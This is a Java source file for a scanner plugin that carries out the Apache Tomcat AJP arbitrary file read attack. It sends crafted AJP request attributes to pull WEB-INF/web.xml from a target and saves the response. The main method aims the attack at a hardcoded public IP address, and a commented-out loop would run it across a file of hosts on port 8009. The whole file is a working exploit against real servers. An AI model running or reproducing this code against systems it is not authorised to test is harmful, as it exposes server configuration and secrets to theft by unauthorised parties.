package com.gbw.scanner.plugins.scripts.web.tomcat;

import com.gbw.scanner.Host;
import com.gbw.scanner.plugins.scripts.GBWScanScript;
import com.gbw.scanner.plugins.scripts.GBWScanScriptCommonConfig;
import com.gbw.scanner.sink.SinkQueue;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class GBWScanAJPScript implements GBWScanScript {

    private static final Logger log = LoggerFactory.getLogger(GBWScanScript.class);

    private GBWScanAJPConfig config;

    public GBWScanAJPScript(GBWScanAJPConfig config){

        this.config = config;
    }

    @Override
    public GBWScanScriptCommonConfig getConfig() {
        return config;
    }

    @Override
    public boolean isAccept(Host host) {
        return true;
    }

    private GBWAJPMessage createAJPMessage(Host host){

        GBWAJPForwardRequest request = new GBWAJPForwardRequest(host,config.getUri());

	    request.addHeader(GBWAJPConstants.getHeaderString(GBWAJPConstants.SC_REQ_ACCEPT),"text/html");
        request.addHeader(GBWAJPConstants.getHeaderString(GBWAJPConstants.SC_REQ_CONNECTION),"keep-alive");
        request.addHeader(GBWAJPConstants.getHeaderString(GBWAJPConstants.SC_REQ_CONTENT_LENGTH),"0");

        request.addAttr("req_attribute","javax.servlet.include.request_uri,/");
        request.addAttr("req_attribute",String.format("javax.servlet.include.path_info,%s",config.getFile()));
        request.addAttr("req_attribute","javax.servlet.include.servlet_path,/");

        request.setIs_ssl(config.isSSL());
        request.setData_direction(GBWAJPConstants.SERVER_TO_CONTAINER);
        return request.createMessage(4096);
    }

    @Override
    public void scan(Host host, SinkQueue sinkQueue) {

        GBWAJPClient client = null;
        try{
            client = new GBWAJPClient(host,config);

            GBWAJPMessage message = createAJPMessage(host);

            byte[] data = client.sendAndReceive(message,null);

            if(data!=null&&data.length>0){

                log.warn(String.format("Find a apache tomcat ajp any file download poc in:%s:%d",host.getServer(),host.getPort()));
                //System.out.println(String.format("Find a apache tomcat ajp any file download poc in:%s:%d",host.getServer(),host.getPort()));
                sinkQueue.put(new GBWScanAJPResult(config,host,data));

                //System.out.println(new String(data));
            }
        }catch (Exception e){
            e.printStackTrace();
        }finally {

            if(client!=null)
                client.close();
        }
    }



    public static void main(String[] args)  {

        GBWScanAJPConfig config = new GBWScanAJPConfig();
        config.setFile("WEB-INF/web.xml");
        config.setFilePrefix("web.xml");
        config.setStoreDir("D:\\shajf_dev\\GBWScanner\\target");
        config.setSSL(false);
        config.setConTimeout(10000);
        config.setReadTimeout(10000);
        config.setUri("/");
        config.setMaxLen(8192);
        GBWScanAJPScript scanAJPScript = new GBWScanAJPScript(config);

/*
        for (String line:Files.readAllLines(Paths.get("D:\\shajf_dev\\GBWScanner\\target\\8009.data"))){

            String[] ips = line.split(":");

            Host host = new Host(ips[0],ips[0],Integer.parseInt(ips[1]),null,"tcp");

            System.out.println("start:"+host.getHost());

            scanAJPScript.scan(host,null);
        }*/


        Host host = new Host("69.89.15.79","69.89.15.79",8009,null,"tcp");
        scanAJPScript.scan(host,null);
    }

}
